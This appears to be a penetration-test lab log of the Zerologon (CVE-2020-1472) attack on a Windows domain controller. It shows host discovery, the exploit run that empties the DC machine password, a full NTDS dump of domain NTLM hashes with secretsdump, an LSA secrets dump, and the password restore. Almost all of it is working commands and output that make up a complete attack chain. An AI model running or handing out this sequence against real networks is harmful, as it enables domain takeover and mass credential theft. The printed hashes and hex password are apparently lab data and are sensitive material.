** Latest impacket setup required. https://github.com/SecureAuthCorp/impacket
** CVE-2020-1472 weaponized PoC. https://github.com/dirkjanm/CVE-2020-1472

## identifying DC 
root@kali:~/CVE-2020-1472# nbtscan -v -s : 10.128.0.0/24
10.128.0.1:DC-GEMINI      :00U
10.128.0.1:GEMINI         :1cG
10.128.0.4:DESKTOP-P6744CC:20U
10.128.0.4:__MSBROWSE__:01G
10.128.0.4:MAC:00:0c:29:ac:12:d7
root@kali:~/CVE-2020-1472#

## SMB enumeration to get domain name and info
root@kali:~/CVE-2020-1472# crackmapexec smb 10.128.0.1
SMB         10.128.0.1      445    DC-GEMINI        [*] Windows Server 2016 Essentials 14393 (name:DC-GEMINI) (domain:GEMINI.local) (signing:True) (SMBv1:True)

## Slamming the CVE PoC
root@kali:~/CVE-2020-1472# python3 cve-2020-1472-exploit.py DC-GEMINI 10.128.0.1
Performing authentication attempts...
===================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0

Exploit complete!

## secretsdump.py with empty password
root@kali:~/CVE-2020-1472# secretsdump.py GEMINI/DC-GEMINI\$@DC-GEMINI.GEMINI.local -no-pass -just-dc
Impacket v0.9.22.dev1+20200915.115225.78e8c8e4 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: [Errno Connection error (DC-GEMINI.GEMINI.local:445)] [Errno -2] Name or service not known
[*] Cleaning up...
root@kali:~/CVE-2020-1472# secretsdump.py GEMINI/DC-GEMINI\$@DC-GEMINI -no-pass -just-dc
Impacket v0.9.22.dev1+20200915.115225.78e8c8e4 - Copyright 2020 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b19bfb19f97d50bb734e685509e22c62:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:343afbb636758d2f3a69ed5d5da21118:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
srv2016:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
GEMINI.local\gemini-da:1001:aad3b435b51404eeaad3b435b51404ee:b19bfb19f97d50bb734e685509e22c62:::
GEMINI.local\johnny.d:1118:aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f:::
GEMINI.local\Aaren.k:1120:aad3b435b51404eeaad3b435b51404ee:07d128430a6338f8d537f6b3ae1dc136:::
GEMINI.local\Aarika.k:1121:aad3b435b51404eeaad3b435b51404ee:c0aada8974c4f1aa8fd0e44388372e03:::
GEMINI.local\Abagael.k:1122:aad3b435b51404eeaad3b435b51404ee:c0aada8974c4f1aa8fd0e44388372e03:::
[..]
[..]
GEMINI.local\pentest:2136:aad3b435b51404eeaad3b435b51404ee:daa8e4520f1da5b2bff8da06ea306db0:::
DC-GEMINI$:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
MediaAdmin$:1116:aad3b435b51404eeaad3b435b51404ee:27f502a9fc3cfc78df4bf530369fa71f:::
DESKTOP-UHGKA6T$:1119:aad3b435b51404eeaad3b435b51404ee:91fe7a07e3cbb04cfb597804aa892301:::
IIS-2012$:1234:aad3b435b51404eeaad3b435b51404ee:d41d306372ae41ab030209aae0003fbd:::
DESKTOP-P6744CC$:2137:aad3b435b51404eeaad3b435b51404ee:8c9fd4a5f123272f3c9ebefa4ee38f18:::

## Restoring order requires LSA dump. Get the original computer machine password of the DC from the local registry hives.
root@kali:~/CVE-2020-1472# secretsdump.py -sam 10.128.0.1-C_LSA_sam.save -security 10.128.0.1-C_LSA_security.save -system 10.128.0.1-C_LSA_system.save LOCAL
Impacket v0.9.22.dev1+20200915.115225.78e8c8e4 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x73efb11b04de94077d1f22c445f290e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
[..SNIPPED..]
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:9720dbde0a13c39eda9050fa0cb1a132ceaa5c080be6c37cbe7679686cae752ff2fa5fe4d9ca1b5e1daf19546a875ef5606b8f877440b4ee388c71b40583df501284e38d741db4b5f2e189f1592fd9d55f33a44b4d7ed1192f7b16d83f27124ec8e7048e1ba0d94345e3a97f3a5b50509742dfae6abb1a2a88a6c3a5d26f0889f887f3138fd94da57a05b6df1a946776e90401bcefc61fb110acf0944285bdece79ffc641f891047762d2ef1f49800165415cd6bf174eb7e7de4f0b6f1a13a2a2ffb8c67009fbdfab00fd2caae217fd4785ee189583049c3f7db475090a806f060227266053dc5998098a9e2cdebdaf0
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:d4d4e59afc4c45e3b46018bfe188cd62
[*] DPAPI_SYSTEM
[..SNIPPED..]
[*] Cleaning up...
root@kali:~/CVE-2020-1472#

## Restoring order. Taking the machine account of the DC password and setting it back in the NTDS.dit file
root@kali:~/CVE-2020-1472# python3 restorepassword.py GEMINI/DC-GEMINI@DC-GEMINI -target-ip 10.128.0.1 -hexpass 9720dbde0a13c39eda9050fa0cb1a132ceaa5c080be6c37cbe7679686cae752ff2fa5fe4d9ca1b5e1daf19546a875ef5606b8f877440b4ee388c71b40583df501284e38d741db4b5f2e189f1592fd9d55f33a44b4d7ed1192f7b16d83f27124ec8e7048e1ba0d94345e3a97f3a5b50509742dfae6abb1a2a88a6c3a5d26f0889f887f3138fd94da57a05b6df1a946776e90401bcefc61fb110acf0944285bdece79ffc641f891047762d2ef1f49800165415cd6bf174eb7e7de4f0b6f1a13a2a2ffb8c67009fbdfab00fd2caae217fd4785ee189583049c3f7db475090a806f060227266053dc5998098a9e2cdebdaf0
Impacket v0.9.22.dev1+20200915.115225.78e8c8e4 - Copyright 2020 SecureAuth Corporation

[*] StringBinding ncacn_ip_tcp:10.128.0.1[49668]
Change password OK
root@kali:~/CVE-2020-1472#




